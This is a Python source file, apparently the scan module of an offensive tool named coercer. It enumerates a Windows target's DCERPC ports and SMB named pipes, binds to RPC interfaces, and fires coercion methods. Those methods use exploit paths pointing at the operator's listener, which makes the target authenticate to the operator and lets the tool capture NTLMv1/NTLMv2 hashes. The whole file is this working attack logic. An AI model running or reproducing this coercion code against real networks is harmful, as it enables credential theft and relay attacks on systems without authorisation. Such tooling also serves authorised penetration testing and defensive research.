#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : scan.py
# Author             : Podalirius (@podalirius_)
# Date created       : 18 Sep 2022


import time
from coercer.core.Filter import Filter
from coercer.core.utils import generate_exploit_path_from_template
from coercer.network.DCERPCSession import DCERPCSession
from coercer.structures.TestResult import TestResult
from coercer.network.authentications import trigger_and_catch_authentication
from coercer.network.smb import can_connect_to_pipe, can_bind_to_interface
from coercer.network.utils import get_ip_addr_to_listen_on, get_next_http_listener_port
from coercer.network.rpc import portmap_discover, is_port_open, can_bind_to_interface_on_port


def action_scan(target, available_methods, options, credentials, reporter):
    http_listen_port = 0

    filter = Filter(
        filter_method_name=options.filter_method_name,
        filter_protocol_name=options.filter_protocol_name,
        filter_pipe_name=options.filter_pipe_name
    )

    portmap = {}
    if "dcerpc" in options.filter_transport_name:
        if not options.dce_ports:
            portmap = portmap_discover(target, options.dce_port)
        else:
            portmap = {}

    # Preparing tasks ==============================================================================================================

    tasks = {}
    for method_type in available_methods.keys():
        for category in sorted(available_methods[method_type].keys()):
            for method in sorted(available_methods[method_type][category].keys()):
                instance = available_methods[method_type][category][method]["class"]

                if filter.method_matches_filter(instance):
                    for access_type, access_methods in instance.access.items():
                        if access_type not in tasks.keys():
                            tasks[access_type] = {}

                        # Access through SMB named pipe
                        if access_type == "ncan_np":
                            for access_method in access_methods:
                                namedpipe, uuid, version = access_method["namedpipe"], access_method["uuid"], access_method["version"]
                                if filter.pipe_matches_filter(namedpipe):
                                    if namedpipe not in tasks[access_type].keys():
                                        tasks[access_type][namedpipe] = {}

                                    if uuid not in tasks[access_type][namedpipe].keys():
                                        tasks[access_type][namedpipe][uuid] = {}

                                    if version not in tasks[access_type][namedpipe][uuid].keys():
                                        tasks[access_type][namedpipe][uuid][version] = []

                                    if instance not in tasks[access_type][namedpipe][uuid][version]:
                                        tasks[access_type][namedpipe][uuid][version].append(instance)

                        elif access_type == "ncacn_ip_tcp":
                            for access_method in access_methods:
                                uuid, version = access_method["uuid"], access_method["version"]
                                for port in options.dce_ports or portmap.get("ncacn_ip_tcp",{}).get("%s v%s"%(uuid.upper(),version),[]):
                                    if port not in tasks[access_type].keys():
                                        tasks[access_type][port] = {}

                                    if uuid not in tasks[access_type][port].keys():
                                        tasks[access_type][port][uuid] = {}

                                    if version not in tasks[access_type][port][uuid].keys():
                                        tasks[access_type][port][uuid][version] = []

                                    if instance not in tasks[access_type][port][uuid][version]:
                                        tasks[access_type][port][uuid][version].append(instance)

    # Executing tasks =======================================================================================================================

    listening_ip = get_ip_addr_to_listen_on(target, options)
    if options.verbose:
        print("[+] Listening for authentications on '%s', SMB port %d" % (listening_ip, options.smb_port))

    # Processing ncan_np tasks
    if len(tasks.keys()) == 0:
        return None
    if "dcerpc" in options.filter_transport_name:
        ncacn_ip_tcp_tasks = tasks.get("ncacn_ip_tcp", {})
        for port in sorted(ncacn_ip_tcp_tasks.keys()):
            if is_port_open(target, port):
                print("[+] DCERPC port '\x1b[1;94m%d\x1b[0m' is \x1b[1;92maccessible\x1b[0m!" % port)
                for uuid in sorted(ncacn_ip_tcp_tasks[port].keys()):
                    for version in sorted(ncacn_ip_tcp_tasks[port][uuid].keys()):
                        if can_bind_to_interface_on_port(target, port, credentials, uuid, version):
                            print("   [+] Successful bind to interface (%s, %s)!" % (uuid, version))
                            for msprotocol_class in sorted(ncacn_ip_tcp_tasks[port][uuid][version], key=lambda x:x.function["name"]):
                                
                                exploit_paths = msprotocol_class.generate_exploit_templates(desired_auth_type=options.auth_type)
                                
                                stop_exploiting_this_function = False
                                for listener_type, exploitpath in exploit_paths:
                                    if stop_exploiting_this_function == True:
                                        # Got a nca_s_unk_if response, this function does not listen on the given interface
                                        continue
                                    if listener_type == "http":
                                        http_listen_port = get_next_http_listener_port(current_value=http_listen_port, listen_ip=listening_ip, options=options)

                                    exploitpath = generate_exploit_path_from_template(
                                        template=exploitpath,
                                        listener=options.path_ip or listening_ip,
                                        http_listen_port=options.http_port,
                                        smb_listen_port=options.smb_port
                                    )

                                    if options.path_ip:
                                        print("   [+] Using user provided path %s" % exploitpath)

                                    msprotocol_rpc_instance = msprotocol_class(path=exploitpath)
                                    dcerpc = DCERPCSession(credentials=credentials, verbose=True)
                                    dcerpc.connect_ncacn_ip_tcp(target=target, port=port)

                                    if dcerpc.session is not None:
                                        dcerpc.bind(interface_uuid=uuid, interface_version=version)
                                        if dcerpc.session is not None:
                                            reporter.print_testing(msprotocol_rpc_instance)

                                            result = trigger_and_catch_authentication(
                                                options=options,
                                                dcerpc_session=dcerpc.session,
                                                target=target,
                                                method_trigger_function=msprotocol_rpc_instance.trigger,
                                                listenertype=listener_type,
                                                listen_ip=listening_ip,
                                                http_port=http_listen_port
                                            )

                                            reporter.report_test_result(
                                                target=target,
                                                uuid=uuid, version=version, namedpipe=namedpipe,
                                                msprotocol_rpc_instance=msprotocol_rpc_instance,
                                                result=result,
                                                exploitpath=exploitpath
                                            )

                                            if result == TestResult.NCA_S_UNK_IF:
                                                stop_exploiting_this_function = True

                                            if options.stop_on_ntlm_auth and result in [TestResult.SMB_AUTH_RECEIVED_NTLMv1, TestResult.SMB_AUTH_RECEIVED_NTLMv2]:
                                                print("[!] NTLM authentication received; moving on to next target")
                                                return None

                                    if options.delay is not None:
                                        # Sleep between attempts
                                        time.sleep(options.delay)
                        else:
                            if options.verbose:
                                print("   [!] Cannot bind to interface (%s, %s)!" % (uuid, version))
            else:
                if options.verbose:
                    print("[!] DCERPC port '\x1b[1;94m%d\x1b[0m' is \x1b[1;91mclosed\x1b[0m!" % port)

    if "msrpc" in options.filter_transport_name:
        ncan_np_tasks = tasks["ncan_np"]
        for namedpipe in sorted(ncan_np_tasks.keys()):
            if can_connect_to_pipe(target, namedpipe, credentials):
                print("[+] SMB named pipe '\x1b[1;94m%s\x1b[0m' is \x1b[1;92maccessible\x1b[0m!" % namedpipe)
                for uuid in sorted(ncan_np_tasks[namedpipe].keys()):
                    for version in sorted(ncan_np_tasks[namedpipe][uuid].keys()):
                        if can_bind_to_interface(target, namedpipe, credentials, uuid, version):
                            print("   [+] Successful bind to interface (%s, %s)!" % (uuid, version))
                            for msprotocol_class in sorted(ncan_np_tasks[namedpipe][uuid][version], key=lambda x:x.function["name"]):

                                exploit_paths = msprotocol_class.generate_exploit_templates(desired_auth_type=options.auth_type)

                                stop_exploiting_this_function = False
                                for listener_type, exploitpath in exploit_paths:
                                    if stop_exploiting_this_function == True:
                                        # Got a nca_s_unk_if response, this function does not listen on the given interface
                                        continue
                                    if listener_type == "http":
                                        http_listen_port = get_next_http_listener_port(current_value=http_listen_port, listen_ip=listening_ip, options=options)

                                    exploitpath = generate_exploit_path_from_template(
                                        template=exploitpath,
                                        listener=listening_ip,
                                        http_listen_port=options.http_port,
                                        smb_listen_port=options.smb_port
                                    )

                                    msprotocol_rpc_instance = msprotocol_class(path=exploitpath)
                                    dcerpc = DCERPCSession(credentials=credentials, verbose=True)
                                    dcerpc.connect_ncacn_np(target=target, pipe=namedpipe)

                                    if dcerpc.session is not None:
                                        dcerpc.bind(interface_uuid=uuid, interface_version=version)
                                        if dcerpc.session is not None:
                                            reporter.print_testing(msprotocol_rpc_instance)

                                            result = trigger_and_catch_authentication(
                                                options=options,
                                                dcerpc_session=dcerpc.session,
                                                target=target,
                                                method_trigger_function=msprotocol_rpc_instance.trigger,
                                                listenertype=listener_type,
                                                listen_ip=listening_ip,
                                                http_port=http_listen_port
                                            )

                                            reporter.report_test_result(
                                                target=target,
                                                uuid=uuid, version=version, namedpipe=namedpipe,
                                                msprotocol_rpc_instance=msprotocol_rpc_instance,
                                                result=result,
                                                exploitpath=exploitpath
                                            )

                                            if result == TestResult.NCA_S_UNK_IF:
                                                stop_exploiting_this_function = True

                                            if options.stop_on_ntlm_auth and result in [TestResult.SMB_AUTH_RECEIVED_NTLMv1, TestResult.SMB_AUTH_RECEIVED_NTLMv2]:
                                                print("[!] NTLM authentication received; moving on to next target")
                                                return None

                                    if options.delay is not None:
                                        # Sleep between attempts
                                        time.sleep(options.delay)
                        else:
                            if options.verbose:
                                print("   [!] Cannot bind to interface (%s, %s)!" % (uuid, version))
            else:
                if options.verbose:
                    print("[!] SMB named pipe '\x1b[1;94m%s\x1b[0m' is \x1b[1;91mnot accessible\x1b[0m!" % namedpipe)

